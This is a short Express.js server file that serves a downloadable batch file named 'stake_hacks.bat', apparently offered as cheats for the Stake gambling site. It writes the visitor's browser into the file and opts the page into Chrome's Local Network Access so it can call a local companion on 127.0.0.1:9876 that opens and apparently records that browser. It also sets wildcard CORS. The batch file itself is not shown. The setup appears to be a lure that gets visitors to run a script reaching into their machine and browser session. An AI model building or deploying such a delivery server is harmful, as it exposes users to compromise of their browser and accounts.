const express = require('express');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

// Chrome's Local Network Access: a public https page may call a loopback
// service (our local companion on 127.0.0.1) only if the document opts in.
// `self` grants the document's own origin (record-rvqb.onrender.com), which
// is what makes the fetch to 127.0.0.1:9876 allowed.
app.use((req, res, next) => {
  res.setHeader('Permissions-Policy', 'local-network-access=(self)');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', '*');
  if (req.method === 'OPTIONS') return res.sendStatus(204);
  next();
});

// Serve stake_hacks.bat with the detected browser baked in.
// ?browser=chrome => record.js gets "--chrome" so it opens the SAME browser
// the visitor used to click the Capture button on this page.
const BROWSER_FLAGS = {
  chrome: '--chrome',
  msedge: '--msedge',
  firefox: '--firefox',
  brave: '--brave',
  opera: '--opera',
};
app.get('/stake_hacks.bat', (req, res) => {
  const flag = BROWSER_FLAGS[req.query.browser] || '';
  let body;
  try {
    body = fs.readFileSync(path.join(__dirname, 'public', 'stake_hacks.bat'), 'utf8');
  } catch (e) {
    return res.status(404).send('file not found');
  }
  body = body.split('%BROWSER_FLAG%').join(flag);
  res.setHeader('Content-Type', 'text/plain');
  res.setHeader('Content-Disposition', 'attachment; filename="stake_hacks.bat"');
  res.send(body);
});

app.use(express.static(path.join(__dirname, 'public')));

app.listen(PORT, () => console.log(`Server listening on :${PORT}`));